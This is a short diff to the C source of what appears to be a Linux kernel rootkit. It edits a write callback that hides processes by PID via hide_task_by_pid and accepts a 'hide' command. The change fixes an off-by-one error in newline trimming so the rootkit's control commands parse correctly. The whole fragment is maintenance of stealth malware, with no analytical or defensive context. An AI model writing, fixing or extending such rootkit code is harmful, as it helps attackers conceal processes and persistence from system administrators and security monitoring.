@@ -336,12 +336,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
     if(pid > 1)
         hide_task_by_pid(pid);
     else {
-        size_t len = strlen(buf) - 1;
+        size_t len = strlen(buf);
         if(!len)
             goto leave;
 
-        if (buf[len] == '\n')
-            buf[len] = '\0';
+        if (buf[len-1] == '\n')
+            buf[len-1] = '\0';
 
         if(!strcmp(buf, "hide") && !op_lock) {
             static unsigned int msg_lock = 0;
